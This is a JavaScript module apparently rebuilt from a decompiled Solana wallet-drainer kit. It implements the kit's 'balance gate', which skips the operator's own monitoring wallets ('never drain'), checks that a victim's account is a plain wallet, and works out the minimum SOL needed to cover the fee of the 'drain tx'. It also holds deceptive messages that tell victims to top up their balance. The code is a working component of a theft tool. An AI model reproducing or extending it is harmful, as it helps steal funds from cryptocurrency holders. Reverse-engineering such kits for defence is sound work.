'use strict';
/**
 * Balance gate: wallet account check + SOL minimum check.
 * Sources: decompiled/kit/page/balance_gate.js, bundle.deobfuscated.js lines 22092-22107
 *
 * Exclusion set: 6 addresses (operator monitoring wallets) — deob line 33400
 * Never 29: that prior count conflated multiple address arrays.
 */

const { getAccountInfo } = require('../chain/portfolio');
const { solana }         = require('../chain/rpc');
const { EXCLUSION_SET, SYSTEM_PROGRAM } = require('../config/constants');

// Error messages (string table)
const E = {
  INSUFFICIENT: 'You have an insufficient balance',
  TOPUP_PREFIX: 'Top-up your balance by at least ',
  NOT_OWNER:    "You can't perform any actions from this account because you're not it's owner",
  CONNECT_OTHER:'Connect another account',
  TARGET:       'This account is used as target account. Please connect another',
  WATCH:        'This account is not a plain wallet. Please do not connect "Watch Addresses".',
};

/**
 * checkWallet(walletAddress, minLamports):
 *   Returns { ok: true, lamports } or { ok: false, reason, message }
 *
 *   reason: "insufficient" | "not_owner" | "target" | "watch"
 */
async function checkWallet(walletAddress, minLamports) {
  // Exclusion set (operator monitoring addresses — show UI but never drain)
  if (EXCLUSION_SET.has(walletAddress)) {
    return { ok: false, reason: 'target', message: E.TARGET };
  }

  const info = await getAccountInfo(walletAddress, solana);
  if (!info) {
    return { ok: false, reason: 'insufficient', message: E.INSUFFICIENT };
  }

  // Must be a plain SystemProgram account (not a PDA or program)
  if (info.Ee !== SYSTEM_PROGRAM) {
    return { ok: false, reason: 'watch', message: E.WATCH };
  }

  // SOL balance gate
  if (info.K < minLamports) {
    const needed = (minLamports / 1e9).toFixed(2);
    return { ok: false, reason: 'insufficient', message: E.TOPUP_PREFIX + needed + ' SOL' };
  }

  return { ok: true, lamports: info.K };
}

/**
 * computeMinLamports(config):
 *   The minimum is NOT simply config.minSol. It's driven by the
 *   estimated transaction fee for the drain tx (compute units × price),
 *   plus a safety margin. The balance gate checks:
 *     slot = current compute budget
 *     threshold = slot + (config.minSol * 1e9) [from deob line 23972]
 *   We approximate: minLamports = config.minSol * 1e9 + 150_000 (fee reserve)
 */
function computeMinLamports(config) {
  return Math.ceil(config.minSol * 1e9) + 150_000;
}

module.exports = { checkWallet, computeMinLamports, E };
